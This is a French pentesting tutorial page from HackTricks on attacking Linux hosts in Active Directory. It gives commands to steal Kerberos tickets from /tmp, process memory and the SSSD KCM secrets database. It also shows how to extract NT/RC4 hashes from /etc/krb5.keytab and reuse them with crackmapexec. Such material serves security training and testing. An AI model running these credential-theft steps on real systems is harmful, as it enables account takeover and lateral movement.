# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Une machine linux peut également être présente dans un environnement Active Directory.

Une machine linux dans un AD pourrait **stocker différents tickets CCACHE dans des fichiers. Ces tickets peuvent être utilisés et abusés comme tout autre ticket kerberos**. Pour lire ces tickets, vous devez être le propriétaire du ticket ou **root** sur la machine.

## Énumération

### Énumération AD depuis linux

Si vous avez accès à un AD sous linux (ou bash sous Windows), vous pouvez essayer [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) pour énumérer l'AD.

Vous pouvez également consulter la page suivante pour apprendre **d'autres façons d'énumérer l'AD depuis linux** :

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA est une **alternative** open-source à Microsoft Windows **Active Directory**, principalement pour les environnements **Unix**. Il combine un **annuaire LDAP** complet avec un centre de distribution de clés Kerberos MIT pour une gestion similaire à Active Directory. Utilisant le système de certificats Dogtag pour la gestion des certificats CA et RA, il prend en charge l'**authentification multi-facteurs**, y compris les cartes intelligentes. SSSD est intégré pour les processus d'authentification Unix. En savoir plus à ce sujet dans :

{{#ref}}
../freeipa-pentesting.md
{{#endref}}

## Jouer avec les tickets

### Pass The Ticket

Sur cette page, vous allez trouver différents endroits où vous pourriez **trouver des tickets kerberos à l'intérieur d'un hôte linux**, sur la page suivante, vous pouvez apprendre comment transformer ces formats de tickets CCache en Kirbi (le format que vous devez utiliser sous Windows) et aussi comment effectuer une attaque PTT :

{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

### Réutilisation de tickets CCACHE depuis /tmp

Les fichiers CCACHE sont des formats binaires pour **stocker des identifiants Kerberos** et sont généralement stockés avec des permissions 600 dans `/tmp`. Ces fichiers peuvent être identifiés par leur **format de nom, `krb5cc_%{uid}`,** correspondant à l'UID de l'utilisateur. Pour la vérification des tickets d'authentification, la **variable d'environnement `KRB5CCNAME`** doit être définie sur le chemin du fichier de ticket souhaité, permettant sa réutilisation.

Listez le ticket actuel utilisé pour l'authentification avec `env | grep KRB5CCNAME`. Le format est portable et le ticket peut être **réutilisé en définissant la variable d'environnement** avec `export KRB5CCNAME=/tmp/ticket.ccache`. Le format de nom de ticket Kerberos est `krb5cc_%{uid}` où uid est l'UID de l'utilisateur.
```bash
# Find tickets
ls /tmp/ | grep krb5cc
krb5cc_1000

# Prepare to use it
export KRB5CCNAME=/tmp/krb5cc_1000
```
### Réutilisation de tickets CCACHE depuis le keyring

**Les tickets Kerberos stockés dans la mémoire d'un processus peuvent être extraits**, en particulier lorsque la protection ptrace de la machine est désactivée (`/proc/sys/kernel/yama/ptrace_scope`). Un outil utile à cet effet se trouve à [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), qui facilite l'extraction en s'injectant dans des sessions et en vidant les tickets dans `/tmp`.

Pour configurer et utiliser cet outil, les étapes ci-dessous sont suivies :
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Cette procédure tentera d'injecter dans diverses sessions, indiquant le succès en stockant les tickets extraits dans `/tmp` avec une convention de nommage de `__krb_UID.ccache`.

### Réutilisation des tickets CCACHE à partir de SSSD KCM

SSSD maintient une copie de la base de données à l'emplacement `/var/lib/sss/secrets/secrets.ldb`. La clé correspondante est stockée en tant que fichier caché à l'emplacement `/var/lib/sss/secrets/.secrets.mkey`. Par défaut, la clé n'est lisible que si vous avez des permissions **root**.

L'invocation de **`SSSDKCMExtractor`** avec les paramètres --database et --key analysera la base de données et **décryptera les secrets**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
Le **blob de cache d'identifiants Kerberos peut être converti en un fichier CCache Kerberos utilisable** qui peut être passé à Mimikatz/Rubeus.

### Réutilisation de ticket CCACHE à partir de keytab
```bash
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```
### Extraire des comptes de /etc/krb5.keytab

Les clés des comptes de service, essentielles pour les services fonctionnant avec des privilèges root, sont stockées en toute sécurité dans les fichiers **`/etc/krb5.keytab`**. Ces clés, semblables à des mots de passe pour les services, nécessitent une confidentialité stricte.

Pour inspecter le contenu du fichier keytab, **`klist`** peut être utilisé. L'outil est conçu pour afficher les détails des clés, y compris le **NT Hash** pour l'authentification des utilisateurs, en particulier lorsque le type de clé est identifié comme 23.
```bash
klist.exe -t -K -e -k FILE:C:/Path/to/your/krb5.keytab
# Output includes service principal details and the NT Hash
```
Pour les utilisateurs de Linux, **`KeyTabExtract`** offre la fonctionnalité d'extraire le hachage RC4 HMAC, qui peut être utilisé pour le réemploi du hachage NTLM.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
Sur macOS, **`bifrost`** sert d'outil pour l'analyse des fichiers keytab.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
En utilisant les informations de compte et de hachage extraites, des connexions aux serveurs peuvent être établies en utilisant des outils comme **`crackmapexec`**.
```bash
crackmapexec 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
```
## Références

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)

{{#include ../../banners/hacktricks-training.md}}
